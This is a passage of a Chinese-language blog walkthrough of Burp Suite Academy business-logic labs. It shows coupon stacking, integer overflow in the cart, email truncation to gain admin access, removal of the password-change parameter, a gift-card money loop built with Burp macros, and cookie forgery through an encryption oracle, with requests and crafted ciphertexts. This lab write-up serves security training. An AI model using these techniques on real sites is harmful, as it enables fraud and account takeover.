href="mailto:&#120;&#x78;&#120;&#x40;&#x64;&#x6f;&#x6e;&#116;&#119;&#97;&#110;&#110;&#97;&#99;&#114;&#x79;&#46;&#x63;&#x6f;&#x6d;">&#120;&#x78;&#120;&#x40;&#x64;&#x6f;&#x6e;&#116;&#119;&#97;&#110;&#110;&#97;&#99;&#114;&#x79;&#46;&#x63;&#x6f;&#x6d;</a>格式的邮箱进行验证，邮箱为改格式就有权访问admin页面。</p><p>漏洞点：网站对邮箱更改验证不合格</p><hr><h3 id="4-有缺陷的业务规则执行"><a href="#4-有缺陷的业务规则执行" class="headerlink" title="4.有缺陷的业务规则执行"></a>4.有缺陷的业务规则执行</h3><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102204950.png"></p><p>概括就是交替使用优惠卷，打骨折</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102206588.png"></p><p>钱包还剩100刀了</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102208634.png"></p><p>找到第一个优惠卷</p><p>下拉</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102209972.png"></p><p>底部有一个填邮箱的框，随便填一个得到第二个优惠卷</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102209010.png"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-symbol">NEWCUST5</span><br>SIG<span class="hljs-symbol">NUP30</span><br></code></pre></td></tr></table></figure><p>接下来把最贵的商品加到购物车</p><p>跳到结算页面</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102212892.png"></p><p>交替使用优惠卷可以重复打折</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102214121.png"></p><p>购买成功即为完成实验</p><hr><h3 id="5-低级逻辑缺陷"><a href="#5-低级逻辑缺陷" class="headerlink" title="5.低级逻辑缺陷"></a>5.低级逻辑缺陷</h3><p>根据提示，把皮夹克下单之后余额不足订单被拒绝</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102333917.png"></p><p>打开</p><p>http history 找到 POST &#x2F;cart</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102335433.png"></p><p>发包到 intruder</p><p>准备进行测试 quantity的值改为99 quantity&#x3D;99</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102341291.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102344329.png"></p><p>进行爆破</p><p>爆破一段时间之后查看购物车发现</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102347004.png"></p><p>金额太过于庞大，反而成了负数，价格已超过后端编程语言中整数允许的最大值 因此，该值已循环回可能的最小值 </p><p>这时候挑另一件商品进行相同的操作，然后把价格加的正数且低于100.然后下单即可完成</p><p>由于后台限制每次只能添加99，爆破过程有点久，而且价格也不好把控，可以直接照抄份数</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211110008182.png"></p><p>下单即实验完成</p><hr><h3 id="6-异常输入处理不一致"><a href="#6-异常输入处理不一致" class="headerlink" title="6.异常输入处理不一致"></a>6.异常输入处理不一致</h3><p>此实验室未充分验证用户输入。您可以利用其帐户注册过程中的逻辑缺陷来访问管理功能。要解决实验室问题，请访问管理面板并删除卡洛斯。</p><p>这一关完成方法和第三关一样都是要访问admin页面删除Carlos</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211111705110.png"></p><p><strong>根据提示，使用一个过长的邮箱进行注册，网站会因为过长而把邮箱截断，这就可以构造一个very-long-string<code>m</code>@dontwannacry.com的邮箱，然后访问admin</strong></p><p>进入邮箱工具</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211111711484.png"></p><p>给出的邮箱格式为</p><p>@exploit-0ad700710395f84ec08f28cc01ae00b7.exploit-server.net</p><p>抓取一个注册包，构造一个很长的邮箱进行注册</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211111713588.png"></p><p>注册成功之后进行登录</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211111715191.png"></p><p>可以发现我们的邮箱因为太长而被网站截断,而截断长度为255</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211111718878.png"></p><p>因此我们需要构造一个邮箱刚刚 <a href="mailto:&#120;&#120;&#120;&#x78;&#x78;&#64;&#x44;&#x6f;&#x6e;&#116;&#x57;&#x61;&#110;&#x6e;&#x61;&#67;&#x72;&#121;&#x2e;&#x63;&#x6f;&#x6d;">&#120;&#120;&#120;&#x78;&#x78;&#64;&#x44;&#x6f;&#x6e;&#116;&#x57;&#x61;&#110;&#x6e;&#x61;&#67;&#x72;&#121;&#x2e;&#x63;&#x6f;&#x6d;</a>长度刚好为255</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211111720632.png"></p><p>然后我们使用他进行注册</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211111729951.png"></p><p>登录之后查看我的邮箱</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211111730143.png"></p><p>成功构造截断</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211111731714.png"></p><p>成功访问admin页面</p><p>删除carlos完成实验</p><hr><h3 id="7-两用端点上的弱隔离"><a href="#7-两用端点上的弱隔离" class="headerlink" title="7.两用端点上的弱隔离"></a>7.两用端点上的弱隔离</h3><p>登录账号之后进行密码修改</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211112232962.png"></p><p>提交进行抓包</p><p>把current-password&#x3D;peter删除</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211112233494.png"></p><p><strong>漏洞点</strong></p><p>如果把current-password&#x3D;整个键值删除，那么后端就不会对这个参数检验，所以我们可以利用此漏洞对administrator账号进行密码修改</p><p>登录之后删除Carlos完成实验</p><h3 id="8-工作流验证不足"><a href="#8-工作流验证不足" class="headerlink" title="8.工作流验证不足"></a>8.工作流验证不足</h3><p>登录之后，随便下单一个低于100的商品，找到</p><p>GET &#x2F;cart&#x2F;order-confirmation?order-confirmed&#x3D;true 的包</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211112248700.png"></p><p>对他重新发包</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211112249392.png"></p><p>返回</p><p>“You have not checked out”</p><p>观察这个包并没有对应的商品参数。而当发出这个包时,会购买成功。那应该是当发出这个包时，会把购物车里的东西全部购买</p><p>现在往购物车添加皮夹克</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211112254578.png"></p><p>回到burp发包</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211112255981.png"></p><p>发现成功购买并且完成实验</p><hr><h3 id="9-通过有缺陷的状态机绕过身份验证"><a href="#9-通过有缺陷的状态机绕过身份验证" class="headerlink" title="9.通过有缺陷的状态机绕过身份验证"></a>9.通过有缺陷的状态机绕过身份验证</h3><p>登录之后发现要选择身份</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211130005943.png"></p><p>但是没有admin，访问admin页面提示权限不足</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211130007433.png"></p><p>接着注销之后回到登录页面进行抓包</p><p>登录请求会发送两个包 把第二个包删除</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211130013058.png"></p><p>然后回到网站主页发现，以及可以访问admin页面</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211130011078.png"></p><p>第二个包发出用于确认用户身份、权限等，删除这个包会得到默认权限即admin</p><h3 id="11-无限金钱逻辑缺陷"><a href="#11-无限金钱逻辑缺陷" class="headerlink" title="11.无限金钱逻辑缺陷"></a>11.无限金钱逻辑缺陷</h3><p>登录账号之后 进入首页下滑找到注册通讯录</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211132249997.png"></p><p>然后可以获得一张卷</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211132250724.png"></p><p> SIGNUP30</p><p>然后随便找一个买得起的一个东西下单 并用上优惠卷</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211132323300.png"></p><p>购买成功之后会返回一个code</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211132324777.png"></p><p>返回钱包兑换</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211132325609.png"></p><p>使用之后会返现回你的钱包</p><p>第一个码是优惠卷可以让商品打折</p><p>第二是返现码，可以把商品价格的金额返现，注意这里是返现未打折的商品价格，意思就是我不仅花钱还倒赚，因为如果无限重复这些步骤那岂不是可以无限刷钱</p><p>只要按照顺序请求这些包就可以刷</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">POST <span class="hljs-string">/cart</span>     <span class="hljs-string">//</span>将商品添加至购物车<br>POST <span class="hljs-string">/cart/coupon</span>  <span class="hljs-string">//</span>使用优惠卷减少商品价格<br>POST <span class="hljs-string">/cart/checkout</span> <span class="hljs-string">//</span>付款购物车<br>GET <span class="hljs-string">/cart/order-confirmation</span>?order-confirmed=<span class="hljs-literal">true</span> <span class="hljs-string">//</span>根据付款情况确定是否返回code<br>POST <span class="hljs-string">/gift-card</span> <span class="hljs-string">//code</span>兑换<br></code></pre></td></tr></table></figure><p> 因此我们尝试使用burp创建一个项目帮我们完成这些步骤，</p><p>使用burp project options 点击session 然后add</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211132347934.png"> </p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152037043.png"></p><p>点击添加，选择run macro</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152038022.png"></p><p>然后再点击添加</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152039122.png"></p><p>接下来就来到选择页面，这里有个坑，需要把前面提到的五个包全部选上，我第一次用的时候还不知道怎么多选,按住ctrl 再点击即可多选</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152039989.png"></p><p>选择好之后选择</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span> /cart/<span class="hljs-keyword">order</span>-confirmation?<span class="hljs-keyword">order</span>-confirmed=<span class="hljs-keyword">true</span> <br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152044968.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152046382.png"></p><p>给这个配置起名为gift-card 鼠标选择code返回码 插件会自动生产正则表达式帮我们在返回包中筛选出code</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152046716.png"></p><p>然后配置第五个包 POST &#x2F;gift-card &#x2F;&#x2F;code兑换，只需要把gitf-card选项改为接收第四个返回包即可</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152049194.png"></p><p>配置结束之后点击测试</p><p>结果如图，第四个包返回值为200 而且其成功把code返回则配置成功</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152105763.png"></p><p>然后在HTTP历史里选择一个无关的包发送到intruder然后进行爆破</p><p>接下来常规操作就不贴图片了</p><p>进行无payload 爆破420次可以把钱包里的余额增大到可以购买皮夹克，爆破时把线程调低，速度不能太快</p><p>然后就可以购买完成实验</p><hr><h3 id="12-通过加密预言机绕过身份验证"><a href="#12-通过加密预言机绕过身份验证" class="headerlink" title="12.通过加密预言机绕过身份验证"></a>12.通过加密预言机绕过身份验证</h3><p>登录时打勾保持登录</p><p>随便访问一篇文章，进行评论当你输入的邮箱格式正确，可以成功提交评论</p><p>当输入格式错误的邮箱如qqq.com时会被重定向，而且报错</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152239263.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152239799.png"></p><p>会把错误的邮箱打印到页面</p><p>然后把下面两个包发送到repeater</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/post/</span>comment 提交评论 错误则被重定向<br>/post?postId=<span class="hljs-number">6</span> 错误引起的重定向<br></code></pre></td></tr></table></figure><p>观察这两个包的cookie</p><p>&#x2F;post&#x2F;comment </p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152245107.png"></p><p>&#x2F;post?postId&#x3D;6</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152246963.png"></p><p>都有三个参数但是notification的值不同，而且notification的翻译是通知把</p><p>stay-logged-in 的值赋予notification 发包发现 &#x2F;post?postId&#x3D;6的响应包里出现了</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152250709.png"></p><p>这是用户名：时间戳格式</p><p>那么说明stay-logged-in的参数被解密，那么我们就可以构造admin用户的stay-logged-in获取admin权限</p><p>而&#x2F;post&#x2F;comment 的返回包里带有notification 并且与 &#x2F;post?postId&#x3D;6的请求包里的值是一样的说名这个就是 Invalid email address: 123qq.com 加密之后的秘文</p><p>所以我们构造邮箱</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152256892.png"></p><p>现在将&#x2F;post&#x2F;comment 的包改名为加密</p><p>&#x2F;post?postId&#x3D;6的包改为解密</p><p>方便下文书写</p><p>然后进行加密发包，把返回包里notification的值带到解密包 替换解密包的notification然后发包进行解密</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152302493.png"></p><p>发现确实如此</p><p>所以如果可以把 Invalid email address:去掉就可以剩下用户名和时间戳 然后加入stay-logged-in获取admin权限</p><p>现在使用burp的decoder模块对密文进行解密构造</p><p>这里我获取的密文为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ALWhCvy0GoemMqUBahotT7Jk3VdATUrE5sRurzsbrRZBZnVKAQ1nvHnYnJU</span>%<span class="hljs-number">2</span>b112g2X%<span class="hljs-number">2</span>fT2zL0FI9cZpQyIHIXGg%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d<br></code></pre></td></tr></table></figure><p>然后进行构造顺序为</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">url解密-&gt;base64解密-&gt;删除前<span class="hljs-number">23</span>个字节<span class="hljs-function"><span class="hljs-params">(删除前缀)</span>-&gt;</span>base64加密-&gt;url加密<br></code></pre></td></tr></table></figure><p>处理之后密文为</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%55</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%51</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%42</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%68</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%58</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%45</span><span class="hljs-variable">%76</span><span class="hljs-variable">%77</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%35</span><span class="hljs-variable">%54</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%69</span><span class="hljs-variable">%41</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%74</span><span class="hljs-variable">%54</span><span class="hljs-variable">%49</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%53</span><span class="hljs-variable">%55</span><span class="hljs-variable">%35</span><span class="hljs-variable">%54</span><span class="hljs-variable">%78</span><span class="hljs-variable">%67</span><span class="hljs-variable">%78</span><span class="hljs-variable">%30</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%4</span>a<span class="hljs-variable">%7</span>a<span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%71</span><span class="hljs-variable">%38</span><span class="hljs-variable">%36</span><span class="hljs-variable">%57</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%41</span><span class="hljs-variable">%36</span><span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%66</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%6</span>b<span class="hljs-variable">%2</span>f<span class="hljs-variable">%4</span>b<span class="hljs-variable">%67</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<br></code></pre></td></tr></table></figure><p>然后带到解密包进行解密</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152315264.png"></p><p>提示说密文必须是16的倍数</p><p>那把邮箱部位构造成</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">xxxxxxxxxadministrator</span>：<span class="hljs-number">1668519413419</span> 在前面添加九个字符<br></code></pre></td></tr></table></figure><p>然后再进行一遍构造</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">url解密-&gt;base64解密-&gt;删除前<span class="hljs-number">32</span>个字节<span class="hljs-function"><span class="hljs-params">(删除前缀)</span>-&gt;</span>base64加密-&gt;url加密<br></code></pre></td></tr></table></figure><p>得到密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">%37%72%43%45%2b%56%69%31%4a%4a%6e%67%66%51%6e%62%38%56%53%32%6a%45%6d%62%49%61%65%4e%58%58%5a%65%33%6a%6a%6e%68%62%63%35%4f%41%55%3d<br></code></pre></td></tr></table></figure><p>然后开启拦截访问home页面，填入构造好的密文，放包即可访问admin页面，</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211152324764.png"></p><p>然后删除carlos完成实验</p><hr><p>到此burp靶场的所以逻辑漏洞完结</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>burpsuite靶场</tag>
      
      <tag>逻辑漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
